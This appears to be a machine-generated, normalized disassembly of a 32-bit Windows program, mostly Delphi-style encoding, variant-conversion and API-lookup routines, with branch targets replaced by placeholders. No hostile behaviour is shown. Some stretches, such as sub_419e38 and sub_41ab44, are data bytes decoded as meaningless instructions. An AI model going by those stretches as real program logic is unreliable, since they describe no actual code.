mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
push ecx
push edx
mov edx [ eax + 0x10 ]
push edx
mov eax [ eax + 0xc ]
push eax
call MultiByteToWideChar
pop ebx
pop ebp
retn 0x8
sub_419be0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ecx 0xfde8
xor edx edx
mov eax esi
call sub_419a84
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419c68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x8
push 0x0
mov ecx 0xfde9
xor edx edx
mov eax esi
call sub_419acc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419cb4
push ebx
mov ebx edx
push 0x3
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xef
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xbb
mov eax [ ebx ]
mov [ eax + 0x2 ] 0xbf
pop ebx
retn
sub_419d18
push ebp
mov ebp esp
push ebx
mov ebx ecx
add ebx ebx
mov eax edx
mov edx [ ebp + 0xc ]
mov ecx ebx
call sub_4043c8
mov eax ebx
pop ebx
pop ebp
retn 0x8
sub_419d40
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov ebx eax
mov ecx eax
add ecx ecx
mov eax edx
mov edx [ ebp + 0xc ]
call sub_4043c8
mov eax ebx
pop ebx
pop ebp
retn 0x8
sub_419d78
push ebx
mov ebx edx
push 0x2
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xff
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xfe
pop ebx
retn
sub_419da0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0xc ]
mov esi ecx
dec esi
test esi esi
jl r-xdata
mov eax ecx
add eax eax
pop esi
pop ebx
pop ebp
retn 0x8
inc esi
movzx ebx [ edx ]
shr bx 0x8
mov [ eax ] bl
inc eax
movzx ebx [ edx ]
and bl 0xff
mov [ eax ] bl
inc eax
add edx 0x2
dec esi
jne r-xdata
sub_419dd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov eax edx
inc eax
mov ecx [ ebp + 0x8 ]
dec ecx
test ecx ecx
jl r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc ecx
movzx esi [ eax ]
movzx edi [ edx ]
shl edi 0x8
or si di
mov [ ebx ] si
add edx 0x2
add eax 0x2
add ebx 0x2
dec ecx
jne r-xdata
sub_419e10
push ebx
mov ebx edx
push 0x2
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xfe
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xff
pop ebx
retn
sub_419e38
cmp al 0x9e
inc ecx
add [ ecx ] dl
push cs
push esp
dec esp
popad
outsb
jne r-xdata
dec edx
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 8 ] cl
inc ecx
jb r-xdata
add [ eax ] al
add ah dl
int 0x4a
add [ eax + 0x4a ] al
add [ edx ] al
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 8 ] al
xor dl ah
dec edx
popad
jns r-xdata
add [ eax ] al
add [ ebp + ecx * 8 - 0x1f9bffb6 ] cl
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1d37ffb6 ] al
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0x4a ] bh
add al bl
loop r-xdata
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1fb7ffb6 ] bh
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1ccbffb6 ] dh
dec edx
add [ edx ] al
add [ eax ] al
add ah cl
int 0x4a
add [ eax + 0x4a ] cl
add [ edx ] al
add [ eax ] al
add ah al
int 0x4a
add al al
loop r-xdata
add [ edx ] al
adc al [ eax ]
dec edx
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ edx ] cl
add [ eax ] al
inc eax
adc al [ eax ]
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
add al bh
add [ edx ] al
add [ eax ] al
add [ eax ] ch
int 0x4a
add [ eax + 0x2004adf ] al
add [ eax ] al
add [ eax ] ah
int 0x4a
add [ eax ] dh
fisttp [ edx ]
add al [ eax ]
add [ eax ] al
sbb ch cl
dec edx
add [ eax - 0x1f ] dl
dec edx
add [ edx ] al
add [ eax ] al
add [ eax ] dl
int 0x4a
add ah ch
loope r-xdata
add [ eax - 0x20 ] bh
dec edx
add [ edx ] al
add [ eax ] al
add ah ch
int 0x4a
add [ eax + 0x2004ade ] cl
add [ eax ] al
add ah ah
int 0x4a
add al bl
loopne r-xdata
push ebp
dec edx
add [ eax ] dh
loop r-xdata
add [ eax ] al
add al 0xce
je r-xdata
loope r-xdata
int3
add [ edx ] al
add [ eax ] al
add [ eax ] cl
int 0x4a
add [ esi + ebx * 8 + 0x2004a ] dl
add [ eax ] al
add ch cl
dec edx
add [ edx + 0x2004a ] bh
add [ eax ] al
clc
add [ eax ] al
add [ ebp + ecx * 8 - 0x1e7fffb6 ] ch
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1eabffb6 ] ah
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1cb7ffb6 ] bl
dec edx
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 - 0x1cfbffb6 ] dl
dec edx
add [ edx ] al
add [ edx ] al
add [ eax ] al
add ah bl
int 0x4a
add [ ecx ] dh
dec edx
add [ edx ] al
add [ eax ] al
hlt
add al [ eax ]
insb
jae r-xdata
add [ eax ] al
add ah cl
int3
add [ eax ] al
add [ eax ] al
add ah ah
int3
adc al [ eax ]
add al [ eax ]
nop
pop ds
add [ eax ] al
add [ esi + ecx * 8 ] dh
dec edx
add [ eax ] bh
loope r-xdata
add [ eax ] al
add ah bh
int 0x4a
add [ edi + ebx * 8 + 0x2004a ] ah
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 8 ] ch
dec edx
add [ eax ] al
loopne r-xdata
add [ eax ] al
add ah dh
int 0x4a
dec edx
add al bh
loope r-xdata
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 8 ] ah
dec edx
add [ eax + 0x2004ae1 ] ch
add [ eax ] al
add [ esi + ecx * 8 ] bl
dec edx
add [ eax + 0x2004a ] dl
add [ eax ] al
adc al 0xce
dec edx
add al cl
fimul [ edx ]
add al [ eax ]
add [ eax ] al
or al 0xce
sub_41a390
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
movzx eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_41a3e4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41a43e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_411bc4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a445
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a450
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41a4aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_413838
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4b1
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a4bc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41a516
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4137c8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a51d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a528
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41a582
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4154e8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a589
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a594
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41a5ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4138a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5f5
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a66d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_411cf4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a674
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_41a680
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_41a6e0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_41377c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40730c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6e7
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a6f0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_41a752
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4148e0
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_40730c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a759
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a764
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_41a7c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_411d9c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40730c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a7cf
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41a7f8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_41a824
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleW
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_41a390
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3c0
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3c0
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3cc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3d8
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a3e4
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a450
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a4bc
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a528
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a594
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a600
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a680
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a6f0
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41a764
mov eax r-xdata
call sub_41a7f8
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_41ab44
dec eax
stosd [ edi ]
inc ecx
add [ ebx ] al
adc [ esi + edx * 2 + 0x61 ] edx
jb r-xdata
add al [ eax ]
int3
outsd
insd
jo r-xdata
add [ eax ] al
int3
jb r-xdata
inc ecx
add [ edx - 0x53ffbe55 ] ah
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
inc esi
mov eax 0x80041ab
add [ eax ] al
rol [ eax ] 0x0
insb
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x41 ] al
add [ edx ] cl
arpl [ edx + 0x4c ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
inc esp
stosd [ edi ]
inc ecx
inc ecx
add ah al
add [ eax ] al
cmp al 0xac
push esp
push 0x63076e61
jb r-xdata
stosd [ edi ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
mov [ 0xffffffffac0041ab ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72477263
popad
je r-xdata
stosd [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 - 0x5387ffbf ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] bh
inc ecx
add [ eax ] cl
push 0x56086e61
popad
jb r-xdata
inc ecx
add [ esp + ebp * 4 + 0x41 ] dl
add [ eax ] al
add [ ebp + 0x100041 ] ch
add [ eax ] al
cmp al 0x14
add [ eax - 0x54 ] bh
popad
outsb
je r-xdata
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ecx + ebp + 0x2a880042 ] al
inc edx
add [ edx + ebp ] dl
inc edx
add [ eax + 0x2a ] cl
inc edx
add [ eax ] ch
sub al [ edx ]
sub al [ fs : edx ]
adc [ edx ] ch
inc edx
add ah al
and eax 0x25fc0042
inc edx
add [ eax + 0x68004226 ] cl
inc esi
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x5c004225 ] bh
sub al [ edx ]
push eax
inc edx
add [ esi + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
int3
lodsd [ esi ]
inc ecx
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
sub_41b9e4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41ba2e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba35
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41ba38
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bac7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4221dc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4221dc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bace
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_4068c4
retn
sub_41bad4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41bb1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb25
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41bb28
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41bb72
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb79
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41bb7c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bc0b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4221dc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4221dc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc12
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_4068c4
retn
sub_41bc18
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41bc62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc69
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41bc6c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41beb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41beb8
lea eax [ ebp - 0x40 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x20 ]
mov edx 0x8
call j_sub_4068c4
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
dec eax
je r-xdata
call sub_41b9e4
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
jmp r-xdata
call sub_41bad4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x11
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_415718
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x11
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
jmp r-xdata
sub_41becc
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_41ba38
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_41bb7c
jmp r-xdata
jmp r-xdata
call sub_41bc6c
sub_41bf00
push ebx
push esi
mov esi edx
mov ebx eax
call sub_404288
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
call sub_404288
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_41becc
pop esi
pop ebx
retn
call sub_404288
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_41becc
jmp r-xdata
call sub_4042c8
mov edx eax
mov eax edx
call sub_4060b0
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_41becc
jmp r-xdata
pop esi
pop ebx
retn
sub_41bf84
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41bfce
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfd5
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41bfec
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_41c01c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_41c01c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_41c078
push ebp
mov ebp esp
add esp 0xfffffce4
